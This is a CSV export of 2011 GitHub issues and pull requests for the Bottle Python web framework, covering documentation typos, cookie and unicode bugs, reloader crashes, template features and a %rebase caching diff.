ID,Title,Created At,Closed At,Issues,Errors,Messages,Body
246,Small docs typo.,2011-10-30T16:03:13Z,2011-11-06T13:57:17Z,,,,"Fixes defnull/bottle#243.
"
245,add SocketIOServer support,2011-10-29T01:15:18Z,2012-04-05T08:58:15Z,,,,"socketio is based on gevent-socketio, so i got issue #212 for running the test case on both the gevent and socketio server.

other than that, it works
"
244,support auto reload when modify script,2011-10-28T03:56:31Z,2011-10-28T09:30:13Z,,,,"in flask, it will auto reload, could you support that for develop quickly.
"
243,doc typo in submit form,2011-10-27T15:59:48Z,2011-11-10T09:43:49Z,,,,"in http://bottlepy.org/docs/dev/tutorial.html#request-routing login_form function.

```
return """"""<form method=""POST"">
          <input name=""name""     type=""text"" />
          <input name=""password"" type=""password"" />
          </from>""""""
```

should be

```
return """"""<form method=""POST"" >
            Login Form
            <br/>Name: <input name=""name""     type=""text"" />
            <br/>Password: <input name=""password"" type=""password"" />
            <br/><input type=""submit"" value=""Submit"">
            </form>""""""
```
"
242,set_cookie() does not work with expire=date/datetime/int,2011-10-27T10:11:27Z,2011-10-27T15:11:10Z,Bug,,,"The `expires` parameter for Response.set_cookie() does not work as documented or expected. It should accept epoch timestamps and datetime objects, too.

Details: http://stackoverflow.com/questions/7913169/python-bottle-persistent-cookie-not-working
"
241,Python3 Cookie Encode/Decode Error,2011-10-20T02:52:48Z,2011-10-24T15:45:59Z,,TypeError,"TypeError: expected bytes, but got 'str'","After running 2to3, bottle.py would fail to encode secure cookies, raising the following type error and issuing an HTTP 500:

```
TypeError: expected bytes, but got 'str'
```

To fix this, I simply encoded the key in both cookie_encode and cookie_decode. The bug has been marked as ""wontfix"" in the Python Standard Library, per issue 5285: http://bugs.python.org/issue5285

Also fixes the same issue in Python 2.6 and is backwards compatible with 2.5, as noted above.
"
240,Bottle server crashes on reload when code has syntax error,2011-10-18T20:17:48Z,2011-11-15T21:34:35Z,Request,,,"In my attempts to get around this myself, I've discovered that this may simply be impossible, but it would be really nice if the bottle server (`bottle.run(reloader=True)`) wouldn't crash out when it reloads a file with a syntax error.  

I realize that this may be impossible to fix since it's the interpreter itself throwing the exception, but if the server could somehow catch this and keep itself alive until the next reload it would be much more convenient.  The main reason I use the dev server instead of Apache is that I don't want to restart the server for every code change I make.  But I find that the bottle server has to be restarted almost as often as Apache because of syntax errors (and other import-time exceptions) that crash the app.

Maybe there's a way to code my wsgi script to handle this myself, but I haven't found a working method.
"
239,"Allow options to be passed into GunicornServer (e.g. worker_class, worker",2011-10-11T21:49:29Z,2011-10-11T22:26:12Z,,,,"Allow options to be passed into GunicornServer (e.g. worker_class, workers)
"
238, jinja2_template not support globals setting,2011-10-05T15:56:35Z,2011-10-17T10:42:02Z,,,," jinja2_template not support globals setting.
can you add  the globals setting to jinja2_template?so if I put request in the globals setting, I can use request directly in the jinja2 template files.bless you.
I realize it like this:

class Jinja2Template(BaseTemplate):
    def prepare(self, filters=None, tests=None, globals=None, *_kwargs):
        from jinja2 import Environment, FunctionLoader
        if 'prefix' in kwargs: # TODO: to be removed after a while
            raise RuntimeError('The keyword argument `prefix` has been removed. '
                'Use the full jinja2 environment name line_statement_prefix instead.')
        self.env = Environment(loader=FunctionLoader(self.loader), *_kwargs)
        if filters: self.env.filters.update(filters)
        if tests: self.env.tests.update(tests)

```
    if globals: self.env.globals.update(globals)

    if self.source:
        self.tpl = self.env.from_string(self.source)
    else:
        self.tpl = self.env.get_template(self.filename)
```
# Mod-End
"
237,"In 0.10 dev,the FormsDict's get method and [] method are not equal to getunicode method",2011-10-05T15:54:59Z,2011-10-17T10:42:14Z,,,," I saw the source code of bottle of 0.10 dev.In my opintion, if the FormsDict's get method and [] method are equal to getunicode method, should it be easy to unicode users?All right, I know this will be not compatible to the old app, But I think it deserve it.Bless you ~~
I try to realize it like this:

class FormsDict(MultiDict):
    #: Encoding used for attribute values.
    input_encoding = 'utf8'

```
def get(self, key, default=None, index=-1, type=None, encoding=None):
    try:
        val = self.dict[key][index]
        value = type(val) if type else val
    except Exception, e:
        return default

    if value is None or type not in (None, str, bytes, unicode):
        return value

    enc = encoding or self.input_encoding

    try:
        if isinstance(value, bytes): # Python 2 WSGI
            return value.decode(enc)
        elif isinstance(value, unicode): # Python 3 WSGI
            return value.encode('latin1').decode(enc)
        return value
    except UnicodeError, e:
        return default

__getattr__ = __getitem__ = get
```
"
236,Error handler crashes with redirect,2011-10-04T22:21:29Z,,,,,"It happens because redirect exception is not handled by Bottle, because it already get an exception (404).

```
import bottle

@bottle.error(404)
def error_route(code):
    bottle.redirect('/')

bottle.debug(True)
bottle.run(reloader=True)
```

I get this exception:

```
<pre>HTTPResponse('HTTP Response 303',)</pre>
<h2>Traceback:</h2>
<pre>Traceback (most recent call last):
  File ""/tmp/t/bottle.py"", line 788, in wsgi
    out = self._cast(self._handle(environ), request, response)
  File ""/tmp/t/bottle.py"", line 741, in _cast
    out = self.error_handler.get(out.status, repr)(out)
  File ""a.py"", line 5, in error_route
    bottle.redirect('/')
  File ""/tmp/t/bottle.py"", line 1748, in redirect
    raise HTTPResponse("""", status=code, header=dict(Location=location))
HTTPResponse: HTTP Response 303
</pre>
```
"
235,"In docs, Tutorial is called Documentation",2011-10-01T04:47:23Z,2011-10-30T15:47:03Z,,,,"The Tutorial page is called Documentation. I suggest to change it to Tutorial, because everything is documentation (/docs/...). 
"
234,Heroku recipe,2011-09-29T17:30:40Z,2011-09-30T10:36:52Z,,,,"Mostly it's just adding links to their documentation. They've done a pretty good job going over everything.
"
233,Two small issues,2011-09-28T16:59:07Z,2011-09-28T17:53:32Z,,,,"An error in SimpleTemplate examples was reported in mailing list (replacing left->leftblock and right->rightblock).

Issue #232 describes another doc error (thanks @pgoetz).
"
232,Documentation correction,2011-09-28T16:33:26Z,2011-09-30T10:44:28Z,,,,"Under:
http://bottlepy.org/docs/dev/tutorial.html#plugins
Application-wide Installation

""Most plugins are save to be installed to all routes and are smart enough to not add overhead to callbacks that do not need their functionality.""

should be

""Most plugins can safely be installed to all routes ...""
"
231,view decorator and plugin keywords issue.,2011-09-28T12:49:42Z,2011-09-28T16:14:46Z,,`TypeError,`TypeError: test() takes exactly 1 argument (0 given)`,"I'm trying to mix the `@view` decorator with the [bottle-sqlalchemy plugin](https://github.com/iurisilvio/bottle-sqlalchemy/), more or less the same as the attached unit test.

This unit test crash with:
`TypeError: test() takes exactly 1 argument (0 given)`
"
230,Add ShpamlTemplate class (& shpaml_template/shpaml_view helpers).,2011-09-25T23:52:13Z,,,,,"This allows templates to be written using SHPAML
(http://shpaml.webfactional.com/) combined with standard SimpleTemplate
directives. The SHPAML templates are transparently converted into HTML
before the SimpleTemplate compilation process. As the compiled
SimpleTemplate code is cached the conversion only happens once and there
is no runtime overhead (except for first call).

As an example:

```
>>> t = """"""\
... html
...   head
...     title | {{title}}
...   body
...     h1 | {{title}}
...     ul.list
...       %for i in l:
...         li.item | {{i}}
...       %end
... """"""
>>> print ShpamlTemplate(t).render(title=""Title"",l=[1,2,3])
<html>
  <head>
    <title>Title</title>
  </head>
  <body>
    <h1>Title</h1>
    <ul class=""list"">
        <li class=""item"">1</li>
        <li class=""item"">2</li>
        <li class=""item"">3</li>
    </ul>
  </body>
</html>

```

A test suite is included which covers pretty much all of the
SimpleTemplate functionality embedded into SHPAML.

From the SHPAML web-site:

SHPAML is a mini language that can help you to build web pages more
quickly. It leverages familiar concepts from HTML and CSS, while
striving to bring brevity and clarity to the primary documents that you
edit. It plays nice with templating languages.
"
229,SimpleTemplate: %rebase does not cache base_template ,2011-09-25T20:49:37Z,2011-09-25T21:11:03Z,,,,"(Hopefully sending the right branch this time)

I noticed that when you use %rebase base_template in SimpleTemplate a new instance of base_template is created for every call and not saved in the cache (which the subtemplate function does for %include sub_template). This is clearly somewhat inefficient & I attach a diff which fixes this (implementing %rebase using the existing subtemplate function).

(I am not too familiar with Git pull-requests so hope this is the right thing to do)
"
228,SimpleTemplate: %rebase does not cache base_template ,2011-09-25T19:54:32Z,2011-09-25T20:49:52Z,,,,"I noticed that when you use `%rebase base_template` in SimpleTemplate a new instance of `base_template` is created for every call and not saved in the cache (which the `subtemplate` function does for `%include sub_template`). This is clearly somewhat inefficient & I attach a diff which fixes this (implementing `%rebase` using the existing `subtemplate` function).

(I am not too familiar with Git pull-requests so hope this is the right thing to do)
"
227,SimpleTemplate: %rebase does not cache base_template,2011-09-25T19:41:02Z,2011-09-25T19:55:53Z,,,,"I noticed that when you use `%rebase base_template` in SimpleTemplate a new instance of base_template is created for every call and not saved in the cache (which the `subtemplate` function does for `%include sub_template`). This is clearly somewhat inefficient & I attach a diff which fixes this (implementing `%rebase` using the existing `subtemplate` function).

```
diff --git a/bottle.py b/bottle.py
index ff94536..81ce2cb 100755
--- a/bottle.py
+++ b/bottle.py
@@ -2658,10 +2658,9 @@ class SimpleTemplate(BaseTemplate):
         eval(self.co, env)
         if '_rebase' in env:
             subtpl, rargs = env['_rebase']
-            subtpl = self.__class__(name=subtpl, lookup=self.lookup)
             rargs['_base'] = _stdout[:] #copy stdout
             del _stdout[:] # clear stdout
-            return subtpl.execute(_stdout, rargs)
+            return self.subtemplate(subtpl,_stdout,rargs)
         return env

     def render(self, *args, **kwargs):
```
"
